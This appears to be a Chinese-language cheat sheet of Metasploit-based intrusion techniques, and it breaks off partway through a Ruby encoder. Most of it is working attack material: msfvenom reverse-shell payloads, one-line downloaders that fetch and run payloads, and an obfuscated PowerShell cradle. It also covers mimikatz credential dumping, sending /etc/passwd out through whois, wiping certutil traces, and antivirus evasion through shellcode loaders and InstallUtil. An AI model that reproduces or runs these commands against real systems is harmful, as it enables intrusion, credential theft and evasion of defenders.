<h2 id="35-与Sqlmap结合攻击"><a href="#35-与Sqlmap结合攻击" class="headerlink" title="35. 与Sqlmap结合攻击"></a>35. 与Sqlmap结合攻击</h2><p><code>load sqlmap</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxx&quot; --random-agent --os-pwn --msf-path &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F; --priv-esc -v 3</span><br><span class="line"></span><br><span class="line">--priv-esc  数据库进程的提权</span><br><span class="line">--os-pwn  注入MSF shell或VNC</span><br></pre></td></tr></table></figure>
<h2 id="42-攻击FTP服务"><a href="#42-攻击FTP服务" class="headerlink" title="42. 攻击FTP服务"></a>42. 攻击FTP服务</h2><ul>
<li>auxiliary/scanner/ftp/ftp_version</li>
<li>auxiliary/scanner/ftp/ftp_login</li>
<li>auxiliary/scanner/ftp/anonymous</li>
</ul>
<p>发现FTP存活主机</p>
<pre><code>* db_nmap -sS -T4 -p21 192.168.1.115</code></pre>
<p>ftp本地模糊测试辅助模块</p>
<ul>
<li>auxiliary/fuzzers/ftp/ftp_pre_post</li>
</ul>
<h2 id="67-meterpreter下的irb操作第一季"><a href="#67-meterpreter下的irb操作第一季" class="headerlink" title="67. meterpreter下的irb操作第一季"></a>67. meterpreter下的irb操作第一季</h2><p><code>Railgun</code>是<code>Meterpreter stdapi</code>的扩展，允许任意加载DLL。<code>Railgun</code>的最大好处是能够动态访问 系统上的整个<code>Windows API</code>。通过从用户进程调用<code>Windows API</code>。</p>
<p><code>meterpreter</code>下执行<code>irb</code>进入<code>ruby</code>交互</p>
<ul>
<li>基本的信息搜集</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.sys.config.sysinfo[&#39;OS&#39;]</span><br><span class="line">&gt;&gt; client.sys.config.getuid</span><br><span class="line">&gt;&gt; interfaces &#x3D; client.net.config.interfaces</span><br><span class="line">&gt;&gt; interfaces.each do |i|</span><br><span class="line">&gt;&gt; end</span><br></pre></td></tr></table></figure>
<ul>
<li>锁定注销目标机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.railgun.user32.LockWorkStation()</span><br></pre></td></tr></table></figure>
<ul>
<li>调用MessageBox</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0, &quot;Micropoor&quot;, &quot;Micropoor&quot;, &quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>快速获取当前绝对路径</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.pwd</span><br></pre></td></tr></table></figure>
<ul>
<li>目录相关操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.chdir(&quot;c:\\&quot;)</span><br><span class="line">&gt;&gt; client.fs.dir.entries</span><br></pre></td></tr></table></figure>
<ul>
<li>建立文件夹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.mkdir(&quot;Micropoor&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>hash操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.core.use &quot;mimikatz&quot;</span><br><span class="line">&gt;&gt; client.mimikatz</span><br><span class="line">&gt;&gt; client.mimikatz.kerberos</span><br></pre></td></tr></table></figure>
<ul>
<li>内网主机发现，如路由，arp等</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.net.config.arp_table</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].ip_addr</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].mac_addr</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].interface</span><br><span class="line">&gt;&gt; client.net.config.routes</span><br></pre></td></tr></table></figure>
<ul>
<li>实战中的敏感文件操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.file.search(&quot;C:\\&quot;, &quot;*.txt&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="97-MSF配置自定义Payload控制目标主机权限"><a href="#97-MSF配置自定义Payload控制目标主机权限" class="headerlink" title="97. MSF配置自定义Payload控制目标主机权限"></a>97. MSF配置自定义Payload控制目标主机权限</h2><p>MSF的exploit模块下是支持<code>set payload</code>的，同样在复杂的网络环境下，许多模块也同样支持自定 义的<code>payload</code>。以<code>exploit/windows/smb/psexec</code>为<code>demo</code></p>
<ul>
<li>需设置一非常用选项</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set EXE::CUSTOM &#x2F;var&#x2F;www&#x2F;html&#x2F;bin_tcp_x86_53.exe</span><br></pre></td></tr></table></figure>
<p>payload启动后，将会在过一段时间内退出。并强制终止。故该参数一般用于adduser。配合adduser_payload。或者配合一次性执行完毕非常连接的 payload。如下载。抓明文密码等等。不适合需长连接通信的payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;adduser PASS&#x3D;Micropoor$123 USER&#x3D;Micropoor ‐ f exe &gt;adduser.exe</span><br></pre></td></tr></table></figure>


<h1 id="五、-下载Payload"><a href="#五、-下载Payload" class="headerlink" title="五、 下载Payload"></a>五、 下载Payload</h1><h2 id="37-vbs一句话下载payload"><a href="#37-vbs一句话下载payload" class="headerlink" title="37. vbs一句话下载payload"></a>37. vbs一句话下载payload</h2><p>将以下文件保存为<code>download.vbs</code></p>
<figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;createobject(“adod”+”b.stream”):</span><br><span class="line">set w&#x3D;createobject(“micro”+”soft.xmlhttp”):</span><br><span class="line">w.open “get”,wsh.arguments(0),0:</span><br><span class="line">w.send:</span><br><span class="line">a.type&#x3D;1:</span><br><span class="line">a.open:</span><br><span class="line">a.write w.responsebody:</span><br><span class="line">a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>
<p>命令行执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt</span><br></pre></td></tr></table></figure>
<p>用<code>echo</code>的方式写入VBS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
<h2 id="38-certutil一句话下载payload"><a href="#38-certutil一句话下载payload" class="headerlink" title="38. certutil一句话下载payload"></a>38. certutil一句话下载payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>certutil.exe 下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载 后，需要马上执行如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt delete</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-encode base64编码文件</p>
<p>-decode base64解码文件</p>
</blockquote>
<h2 id="39-vbs一句话下载payload补充"><a href="#39-vbs一句话下载payload补充" class="headerlink" title="39. vbs一句话下载payload补充"></a>39. vbs一句话下载payload补充</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;c:\test\logo.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>
<h2 id="40-ftp一句话下载payload"><a href="#40-ftp一句话下载payload" class="headerlink" title="40. ftp一句话下载payload"></a>40. ftp一句话下载payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;user </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;password </span><br><span class="line">echo binary &gt;&gt; ftp.txt &#x2F;&#x2F;bin模式 </span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt </span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure>
<h2 id="70-ftp一句话下载payload补充"><a href="#70-ftp一句话下载payload补充" class="headerlink" title="70. ftp一句话下载payload补充"></a>70. ftp一句话下载payload补充</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo open 127.0.0.1 &gt; o&amp;echo user 123 123 &gt;&gt; o &amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o</span><br></pre></td></tr></table></figure>
<p>逆名FTP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo open 127.0.0.1 &gt; o&amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o</span><br></pre></td></tr></table></figure>


<h2 id="41-bitsadmin一句话下载payload"><a href="#41-bitsadmin一句话下载payload" class="headerlink" title="41. bitsadmin一句话下载payload"></a>41. bitsadmin一句话下载payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer down &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot; E:\PDF\robots.txt</span><br></pre></td></tr></table></figure>
<p>需要下载过大的方伯，需要提高优先级，再次执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;setpriority down foreground</span><br></pre></td></tr></table></figure>
<p>如果下载文件在1-5M之间，需要时时查看进度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer down &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot; E:\PDF\robots.txt</span><br></pre></td></tr></table></figure>
<h2 id="43-js一句话下载payload"><a href="#43-js一句话下载payload" class="headerlink" title="43. js一句话下载payload"></a>43. js一句话下载payload</h2><p>download.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">WScript.Echo(WinHttpReq.ResponseText);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.js http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>download2.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); </span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<h2 id="44-certutil一句话下载payload补充"><a href="#44-certutil一句话下载payload补充" class="headerlink" title="44. certutil一句话下载payload补充"></a>44. certutil一句话下载payload补充</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encode c:\downfile.vbs downfile.bat</span><br></pre></td></tr></table></figure>
<p><code>MSF</code>生成<code>powershell</code>后门</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐e cmd/powershell_base64 ‐f psh ‐o Micropoor.txt</span><br></pre></td></tr></table></figure>
<p>启动<code>apache</code>将生成的<code>Micropoor.txt</code>放到<code>web</code>目录中</p>
<p><code>PowerShell</code>混肴框架<code>Invoke-CradleCrafter</code>： <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .&#x2F;Invoke-CradleCrafter.psd1;Invoke-CradleCrafter</span><br><span class="line">SET URL HTTP:&#x2F;&#x2F;192.168.1.5&#x2F;Micropoor.txt </span><br><span class="line">MEMORY</span><br><span class="line">CERTUTIL</span><br><span class="line">ALL</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>可得到如下混肴后的内容,保存为<code>cer.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SV 7Q9 &#39;http:&#x2F;&#x2F;bit.ly&#x2F;L3g1tCrad1e&#39;;(Get-Variable E*xt).Value|ForEach-Object&#123;(Variable _).Value.(((Get-Variable E*xt).Value|Member)[6].Name)|ForEach-Object&#123;$_.(((Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name)|Member|Where&#123;(Variable _).Value.Name-like&#39;*k*i*t&#39;&#125;).Name).Invoke(((certutil.exe &#x2F;ping (LS Variable:&#x2F;7Q9).Value|&amp;(Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).(((Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).PsObject.Methods|Where&#123;(Variable _).Value.Name-like&#39;*md*ts&#39;&#125;).Name).Invoke(&#39;Se*-Ob*&#39;)-SkipLa 1|&amp;(Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).(((Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).PsObject.Methods|Where&#123;(Variable _).Value.Name-like&#39;*md*ts&#39;&#125;).Name).Invoke(&#39;Se*-Ob*&#39;)-Skip 2)-Join&quot;&#96;r&#96;n&quot;))&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encode cer.txt cer.cer</span><br></pre></td></tr></table></figure>
<p>将<code>cer.cer</code>也放置在<code>WEB</code>目录中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.5&#x2F;cer.cer&#39;); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start &#x2F;b cmd &#x2F;c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start &#x2F;b cmd &#x2F;c del %APPDATA%\cer.cer</span><br></pre></td></tr></table></figure>
<h2 id="45-解决bat一句话下载payload黑窗"><a href="#45-解决bat一句话下载payload黑窗" class="headerlink" title="45. 解决bat一句话下载payload黑窗"></a>45. 解决bat一句话下载payload黑窗</h2><p><code>bat.bat</code>内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &gt;&gt; bat.txt</span><br></pre></td></tr></table></figure>
<p><code>bat.vbs</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run &quot;bat.bat&quot;, 0, True</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript bat.vbs</span><br></pre></td></tr></table></figure>
<p>如果需要在目标机上执行多个<code> bat</code>，如果需要把代码中的 <code>bat.bat</code> 变成变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">If WScript.Arguments.Count &gt;&#x3D; 1 Then </span><br><span class="line">	ReDim arr(WScript.Arguments.Count-1) </span><br><span class="line">	For i &#x3D; 0 To WScript.Arguments.Count-1 </span><br><span class="line">		Arg &#x3D; WScript.Arguments(i) </span><br><span class="line">		If InStr(Arg, &quot; &quot;) &gt; 0 Then Arg &#x3D; &quot;&quot;&quot;&quot; &amp; Arg &amp; &quot;&quot;&quot;&quot; </span><br><span class="line">			arr(i) &#x3D; Arg </span><br><span class="line">	Next </span><br><span class="line">	RunCmd &#x3D; Join(arr)</span><br><span class="line">	CreateObject(&quot;Wscript.Shell&quot;).Run RunCmd, 0, True</span><br><span class="line">End If</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript bat.vbs bat.bat</span><br></pre></td></tr></table></figure>
<h2 id="46-powershell一句话下载payload"><a href="#46-powershell一句话下载payload" class="headerlink" title="46. powershell一句话下载payload"></a>46. powershell一句话下载payload</h2><p><code>down.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://118.24.74.232:889/test.png&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;C:\inetpub\robots.txt&quot;</span> </span><br><span class="line"><span class="variable">$start_time</span> = <span class="built_in">Get-Date</span> </span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-OutFile</span> <span class="variable">$output</span> </span><br><span class="line"><span class="built_in">Write-Output</span> <span class="string">&quot;Time : <span class="variable">$</span>((Get-Date).Subtract(<span class="variable">$start_time</span>).Seconds) second(s)&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>powershell</code>一句话下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)</span><br></pre></td></tr></table></figure>
<h2 id="53-内网渗透中的文件传输"><a href="#53-内网渗透中的文件传输" class="headerlink" title="53. 内网渗透中的文件传输"></a>53. 内网渗透中的文件传输</h2><ul>
<li><p>whois 命令传输文件</p>
<ul>
<li>传输机：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois -h 127.0.0.1 -p 4444 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96;</span><br></pre></td></tr></table></figure>
<ul>
<li>授受机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -v -p 4444 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h1 id="六、免杀"><a href="#六、免杀" class="headerlink" title="六、免杀"></a>六、免杀</h1><h2 id="47-payload分离免杀思路"><a href="#47-payload分离免杀思路" class="headerlink" title="47. payload分离免杀思路"></a>47. payload分离免杀思路</h2><ul>
<li>payload不采取生成pe文件，而采取shellcode方式， 来借助第三方直接加载到内存中。避免行为</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.5 lport&#x3D;8080 -e x86&#x2F;shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure>
<ul>
<li>shellcode_launcher 来加载shellcode生成<code>x32</code>位<code>payload</code> <a target="_blank" rel="noopener" href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a> </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher -i test.c</span><br></pre></td></tr></table></figure>
<h2 id="48-payload分离免杀思路第二季"><a href="#48-payload分离免杀思路第二季" class="headerlink" title="48. payload分离免杀思路第二季"></a>48. payload分离免杀思路第二季</h2><ul>
<li>msfvenom生成shellcode</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;10.0.0.1 LPORT&#x3D;443 -f csharp &gt; pentestShellCode.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>csc.exe(InstallUtil-ShellCode.cs 替换文件中shellcode部分)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc.exe &#x2F;unsafe &#x2F;platform:x86 &#x2F;out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
<ul>
<li>InstallUtil.exe</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br></pre></td></tr></table></figure>
<h2 id="49-关于Powershell对抗安全软件"><a href="#49-关于Powershell对抗安全软件" class="headerlink" title="49. 关于Powershell对抗安全软件"></a>49. 关于Powershell对抗安全软件</h2><p>将以下内容写到<code>/usr/share/metasploit-framework/modules/encoders/powershell/base64.rb</code>文件中</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Encoder</span></span><br><span class="line">	Rank = NormalRanking</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></span><br><span class="line">		<span class="keyword">super</span>(</span><br><span class="line">			<span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;Powershell Base64 Encoder&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">				msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows.</span></span><br><span class="line"><span class="string">				&#125;</span>,</span><br><span class="line">			<span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;Micropoor&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD,</span><br><span class="line">			<span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">		register_options([</span><br><span class="line">			OptBool.new(<span class="string">&#x27;payload&#x27;</span>, [ <span class="literal">false</span>, <span class="string">&#x27;Use payload &#x27;</span>, <span class="literal">false</span> ]),</span><br><span class="line">			OptBool.new(<span class="string">&#x27;x64&#x27;</span>, [ <span class="literal">false</span>, <span class="string">&#x27;Use syswow64 powershell&#x27;</span>, <span class="literal">false</span> ])</span><br><span class="line">		])</span><br><span class="line">	<span class="keyword">end</span></span><br><span 